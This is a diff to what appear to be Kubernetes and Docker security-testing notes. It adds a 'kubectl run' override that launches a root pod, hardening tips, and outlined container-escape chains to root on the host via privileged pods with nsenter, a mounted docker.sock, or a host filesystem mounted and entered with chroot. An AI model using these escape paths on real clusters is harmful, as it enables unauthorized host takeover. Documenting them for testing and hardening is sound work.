@@ -184,15 +184,15 @@ kubectl -n kube-system describe secret default
 
 
 
-overrides example
+overrides examples
 --------------------------
 
 overrides='{ "spec": { "hostPID": false, "hostNetwork": false, "securityContext": { "runAsUser": 0 }, "containers": [ { "securityContext": { "privileged": false }, "image": "bitnami/nginx", "name": "nsenter", "stdin": true, "stdinOnce": true, "tty": true, "command": [ "sh" ] } ], "tolerations": [ { "key": "CriticalAddonsOnly", "operator": "Exists" }, { "effect": "NoExecute", "operator": "Exists" } ] } }'
 
 
 overrides='{ "spec": { "securityContext": { "runAsUser": 0 }}}'
-
 k run --image=bitnami/nginx --overrides="$overrides" -ti nginx-as-root sh
+
 
 
 
@@ -224,3 +224,52 @@ kube-controller-manager
 kube-controller-manager --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-name=kubernetes --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --port=0 --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --use-service-account-credentials=true
 
 
+
+
+
+
+General notes:
+-----------------------------------------
+
+* perl exists by default in Ubuntu
+
+* nc and wget exist as BUILT-IN cmds in Alpine as part of Busybox (symbolic links to the same binary)
+
+* make sure that 'sudo' does not exist inside pods and/or that the one present is not vulnerable (there is a CVE)
+
+* docker uses https but you can bypass that by running the socat binary and open a tcp port that connects to the socket. after that you can use docker's -H switch to connect to that tcp port and send docker commands that will be seen in the socat logs on the console where the socat cmd was ran.
+
+* new privs escalation to test - CVE-2021-33909
+
+* a user may gain access to sensitive resources just by assigning it to root group (uid = 0) when creating an image
+
+* strace will not run from within docker even as root unless the relevant capability will be added explicitly to the docker run command. E.g.: docker run -it --cap-add=SYS_PTRACE 8e2d606e619f bash
+
+
+
+* make sure that 'sudo' does not exist inside pods and/or that the one present is not vulnerable (there is a CVE)
+
+* run pods as standard users only
+
+* remove unneeded tools such as networking tools, db clients etc.
+
+* for debugging use a dedicated pod that will be deployed on-demand and will be removed when the debugging is done
+
+* make sure to set the GID as non-root user as well as the user itself because the default GID is ROOT.
+
+* make sure that an app is ran by a non-root user AND that user has ONLY READ privs on the app files (so that no one other than root can EDIT the files) 
+
+
+
+
+Attack vectors:
+-----------------------------------------
+
+1. deployment yaml: psp with privileged mode and pid -> root pod -> nsenter -> root on host
+
+2. deployment yaml: psp with mount to docker.socket -> user pod with docker client -> docker run --privileged --pid=host <pod> nsenter -> root on host
+      -> if the socket is not on the default location or a direct mount point via the yaml is not available, use the env var DOCKER_HOST to change its location before using the docker binary.
+
+3. deployment yaml: psp with privileged mode, pid and "runAsUser=0" -> user pod -> nsenter -> root on host
+
+4. deployment yaml: psp with mount to host root fs -> run any pod with chroot in it -> exec using 'chroot /host sh' -> run 'bash' -> root on host
